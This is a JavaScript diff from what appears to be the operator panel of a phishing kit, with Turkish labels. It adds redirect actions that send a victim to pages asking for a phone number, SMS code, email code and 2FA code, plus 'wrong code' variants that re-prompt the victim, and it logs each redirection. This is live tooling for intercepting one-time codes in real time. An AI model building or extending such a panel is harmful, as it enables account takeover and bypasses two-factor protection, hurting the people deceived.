@@ -976,8 +976,13 @@
 
       const actionMap = {
         'redirect-home': '/login.html',
+        'request-gsm': '/pages/phone.html',
         'sms': '/pages/sms.html',
-        'sms-error': '/pages/sms2.html'
+        'sms-error': '/pages/sms2.html',
+        'mail': '/pages/mailcode.html',
+        'mail-error': '/pages/mailcode2.html',
+        'auth': '/pages/2fa.html',
+        'auth-error': '/pages/2fa2.html'
       };
 
       const redirectTo = actionMap[action];
@@ -1024,8 +1029,13 @@
                 // Sadece başarılı olduğunda mesaj göster
                 const actionNames = {
                   'redirect-home': 'Başa gönder',
+                  'request-gsm': 'GSM iste',
                   'sms': 'SMS\'e gönder',
-                  'sms-error': 'SMS hatalı'
+                  'sms-error': 'SMS hatalı',
+                  'mail': 'Mail kod',
+                  'mail-error': 'Hatalı mail kod',
+                  'auth': 'Auth',
+                  'auth-error': 'Auth hatalı'
                 };
                 const actionName = actionNames[action] || action;
                 updateFormLogsStatus(`${actionName} işlemi gerçekleştirildi - Kullanıcı yönlendiriliyor`);
@@ -1078,23 +1088,9 @@
           case 'password-error':
             updateFormLogsStatus('Şifre hatalı işlemi gerçekleştirildi');
             break;
-          case 'request-gsm':
-            updateFormLogsStatus('GSM iste işlemi gerçekleştirildi');
-            break;
-          case 'mail':
-            updateFormLogsStatus('Mail işlemi gerçekleştirildi');
-            break;
-          case 'mail-error':
-            updateFormLogsStatus('Mail hatalı işlemi gerçekleştirildi');
-            break;
-          case 'auth':
-            updateFormLogsStatus('Auth işlemi gerçekleştirildi');
-            break;
-          case 'auth-error':
-            updateFormLogsStatus('Auth hatalı işlemi gerçekleştirildi');
-            break;
           default:
-            updateFormLogsStatus('Bilinmeyen işlem', true);
+            console.warn('Bilinmeyen işlem:', action);
+            break;
         }
       }
     }
